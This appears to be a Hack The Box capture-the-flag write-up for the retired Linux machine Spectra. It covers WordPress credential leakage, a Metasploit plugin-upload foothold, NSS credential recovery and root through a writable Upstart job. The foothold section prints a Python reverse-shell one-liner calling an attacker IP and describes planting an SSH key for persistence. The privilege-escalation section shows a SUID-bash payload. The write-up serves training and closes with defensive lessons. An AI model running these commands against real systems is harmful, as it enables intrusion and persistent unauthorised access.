# Spectra

| | |
|---|---|
| **Platform** | Hack The Box |
| **OS** | Linux |
| **Difficulty** | Easy |
| **IP Address** | 10.10.10.229 |
| **Status** | Retired |

## Overview
Spectra is an easy Linux machine featuring a WordPress-based "issue tracker" style site. Directory listing exposes a leftover `wp-config.php.save` file containing database credentials that double as valid WordPress admin credentials, enabling a malicious-plugin foothold. Further credential harvesting from the filesystem (an NSS/Firefox profile database and an auto-login configuration script) allows lateral movement to a second user, and a permissive `sudo` rule around `initctl` is abused to escalate to root via Upstart job configuration files.

## Reconnaissance
```
22/tcp   open  ssh     OpenSSH 8.1 (protocol 2.0)
80/tcp   open  http    nginx 1.17.4
3306/tcp open  mysql   MySQL (unauthorized)
```
The web root hosted a WordPress installation reachable under a `/main/` (and `/testing/`) path structure on the `spectra.htb` vhost.

## Enumeration
Directory listing/browsing under `spectra.htb/testing/` exposed a stray backup file, `wp-config.php.save`, containing WordPress database credentials:
```php
define( 'DB_USER', 'devtest' );
define( 'DB_PASSWORD', 'devteam01' );
```
These credentials were valid not only for the database but also for the WordPress `administrator` account (`administrator:devteam01`) on the login page.

## Foothold
With valid WordPress administrator credentials, Metasploit's `exploit/unix/webapp/wp_admin_shell_upload` module was used to install a malicious plugin containing a PHP payload and trigger it, yielding remote code execution as the web server user:
```
set PASSWORD devteam01
set USERNAME administrator
set RHOSTS 10.10.10.229
set TARGETURI /main/
set VHOST spectra.htb
```
A Python one-liner upgraded the shell into a fully interactive session and pivoted toward the local users `chronos` and `katie`:
```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<attacker_ip>",1336));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'
```
An attacker SSH public key was appended to a writable `authorized_keys` file to obtain persistent SSH access, and the target's Firefox/NSS profile databases (`key4.db`, `cert9.db`, `pkcs11.txt`, originally under `/home/nginx/.../nssdb/`) were pulled to the attacker machine for offline analysis. Decoding `key4.db` recovered a stored password hash/blob which, combined with an auto-login helper script found on the host (`/usr/local/sbin/inject-keys.py`, reading `/etc/autologin/passwd`), revealed the plaintext credential `SummerHereWeCome!!`. This password was valid for the `katie` user over SSH, yielding the user flag.

## Privilege Escalation
`sudo -l` as `katie` showed:
```
(ALL) SETENV: NOPASSWD: /sbin/initctl
```
Further enumeration of writable Upstart job files under `/etc/init/` revealed several test job definitions (`test.conf`: `test10.conf`) writable by `katie`. One of these (`test3.conf`) was edited to add a privileged `script` block:
```
script
    chmod +s /bin/bash
end script
```
The job was then started with the permitted `sudo` command:
```
sudo /sbin/initctl start test3
```
Since Upstart jobs run as root by default, this set the SUID bit on `/bin/bash`, and running `/bin/bash -p` produced a root shell.

## Lessons Learned
- Backup/editor artifact files (`*.save`, `*.bak`, `*~`) left in web roots are a classic, and still common: source of leaked credentials.
- Locally stored browser profile databases (NSS `key4.db`/`cert9.db`) can retain saved passwords that are recoverable offline once exfiltrated.
- Writable Upstart/init/systemd job files that can be triggered via a scoped `sudo` rule are equivalent to full root access: treat init-system configuration as sensitive as `/etc/sudoers`.

## Tools & References
- Metasploit `exploit/unix/webapp/wp_admin_shell_upload`
- NSS database analysis (`key4.db`/`cert9.db`) for stored credential recovery
- HackTricks: "Init, init.d, systemd, and rc.d" privilege escalation reference
- `key4.db`, `cert9.db`, `pkcs11.txt` (NSS/Firefox profile database files copied from the target, used to recover the `katie` password): omitted from the repository as opaque binary database blobs; the recovered credential is documented above.
